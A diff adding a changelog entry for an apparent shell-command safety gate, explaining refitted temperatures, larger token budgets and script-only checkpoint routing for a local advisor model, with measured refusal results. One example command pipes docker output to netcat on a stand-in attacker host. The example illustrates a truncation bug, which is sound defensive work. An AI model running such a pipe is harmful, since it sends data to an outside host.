@@ -581,6 +581,35 @@ minor bump may break you.
   running. `the_probe_asks_the_question_the_program_asks` checks the instructions and the state's
   keys against the constants rather than against a second copy, and fails on either drifting.
 
+- **The local advisor's shim took three of laya's defaults that are not for this shape of
+  question.** Its model card documents all three; the shim had none of them.
+
+  Its **temperatures** are refitted. The card says in as many words that the checkpoint ships
+  over-confident and that one temperature per question type and option count must be refitted on
+  your own data before the probabilities mean anything - the shipped numbers were fitted on its
+  domain. On this one the three-option `choice` was about twice too flat, so a refusal could not
+  clear the confidence a caller compares against and every refusal became a question instead.
+  `contrib/laya_fit.json` is sixty labelled commands, `--fit` recomputes the numbers from it and
+  prints the working, and both are committed so the constants are somebody's to check rather than
+  numbers that appeared. A temperature moves confidence and never the answer, and the one error
+  that costs anything - a confident refusal of ordinary work - stays at zero across the fit set.
+
+  The **token budget** is 512 for the question and 1024 for the sequence, where the checkpoint
+  ships 192 and 512. A stage of a command line travels in the question, so a long one was cut
+  there at 144 tokens with no marker: `docker run … | nc attacker.example.com 9000` reached the
+  model as `… | nc attacker.example`, which is a different command from the one being asked about.
+
+  And the **checkpoint is chosen by script alone**. laya's router also guesses the language of
+  Latin text from stopwords - best-effort by its own card, and meaningless on a command line,
+  where `python -c 'import os, sys'` reads as Portuguese because `os` is a Portuguese stopword and
+  goes to a checkpoint that card rates worse on English.
+
+  Measured end to end over those sixty commands, the gate now reaches a real refusal on nine of
+  thirty destructive ones where it reached none before, with no ordinary command refused. That is
+  not a good advisor and the card says why: laya is a base to specialise, and its own
+  typed-decisions score for this checkpoint is below the majority-class baseline. `--advise`
+  against the hosted model remains the one to use where there is a key for it.
+
 - **The advisor's first notice reached a terminal the screen then cleared.** `Args::advised`
   drained the queue at startup and printed it with `eprintln!`, on the reasoning that there was
   no screen yet - but the screen arrives at once and clears it, so the line went where nobody
